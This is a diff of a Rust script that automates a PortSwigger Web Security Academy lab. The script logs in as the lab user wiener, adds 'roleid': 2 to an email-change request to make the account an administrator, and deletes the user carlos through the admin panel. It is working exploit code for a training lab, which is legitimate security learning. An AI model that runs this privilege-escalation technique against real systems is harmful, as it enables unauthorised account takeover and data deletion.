@@ -1,25 +1,17 @@
 /*****************************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 5/9/2023
-*
 * Lab: User role can be modified in user profile
 *
-* Steps: 1. Login as wiener
-*        2. Change the roleid of wiener
-*        3. Fetch the admin panel
-*        4. Delete carlos
+* Hack Steps: 
+*      1. Login as wiener
+*      2. Change the roleid to 2
+*      3. Delete carlos from the admin panel
 *
 ******************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
@@ -29,88 +21,53 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0aeb006f045e825f824c608700cf0074.web-security-academy.net";
+
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
+}
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0abe001c04242bca87c58dbe00ba005d.web-security-academy.net";
+    print!("⦗1⦘ Logging in as wiener.. ");
+    flush_terminal();
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    print!("{} ", "1. Logging in as wiener..".white());
-    io::stdout().flush();
-
-    // login as wiener
-    let login = client
-        .post(format!("{url}/login"))
+    let login_as_wiener = WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
         .form(&HashMap::from([
             ("username", "wiener"),
             ("password", "peter"),
         ]))
         .send()
-        .expect(&format!("{}", "[!] Failed to login".red()));
-
-    // extract session cookie
-    let session = extract_session_cookie(login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
+        .expect(&format!("{}", "⦗!⦘ Failed to login".red()));
 
     println!("{}", "OK".green());
-    print!("{} ", "2. Changing roleid to 2..".white());
-    io::stdout().flush();
+    print!("⦗2⦘ Changing the roleid to 2.. ");
+    flush_terminal();
 
-    // change the email and the roleid of wiener
-    let change_email = client
-        .post(format!("{url}/my-account/change-email"))
-        .header("Cookie", format!("session={session}"))
+    let wiener_session = get_session_cookie(&login_as_wiener);
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/my-account/change-email"))
+        .header("Cookie", format!("session={wiener_session}"))
         .header("Content-Type", "text/plain")
         .body(r#"{"email": "wiener@admin.net", "roleid": 2 }"#)
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to change the email and roleid".red()
+            "⦗!⦘ Failed to change the email and roleid".red()
         ));
 
     println!("{}", "OK".green());
-    print!("{} ", "3. Fetching the admin panel..".white());
-    io::stdout().flush();
+    print!("⦗3⦘ Deleting carlos from the admin panel.. ");
+    flush_terminal();
 
-    // fetch the admin panel
-    // this step in not necessary in the script, you can do step 2 directly
-    // it's only a must when solving the lab using the browser
-    let admin_panel = client
-        .get(format!("{url}/admin"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
+    fetch_with_session("/admin/delete?username=carlos", &wiener_session);
 
     println!("{}", "OK".green());
-    print!("{} ", "4. Deleting carlos..".white());
-    io::stdout().flush();
-
-    // delete carlos
-    client
-        .get(format!("{url}/admin/delete?username=carlos"))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
-
-    println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -118,26 +75,30 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
